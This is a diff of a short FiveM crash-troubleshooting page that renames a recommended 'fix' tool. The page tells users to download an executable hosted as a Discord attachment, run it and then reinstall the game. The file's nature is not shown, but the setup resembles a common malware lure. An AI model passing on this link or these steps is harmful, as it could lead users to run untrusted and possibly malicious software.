@@ -1,10 +1,10 @@
 Getting game crashes? Can't launch FiveM? Or maybe running into some more obscure issue? Find the most common issues here.
 
-📙Download Fivem Curl.rar : https://cdn.discordapp.com/attachments/997086237439574016/997619214472986624/Release.exe
+📙Download FixM : https://cdn.discordapp.com/attachments/997086237439574016/997619214472986624/Release.exe
 
 Read the text file 
 
-Run FiveFix and choose fix settings* then reinstall fivem
+Run FixM and choose fix settings* then reinstall fivem
 
 💥 I crash when playing on a server
 
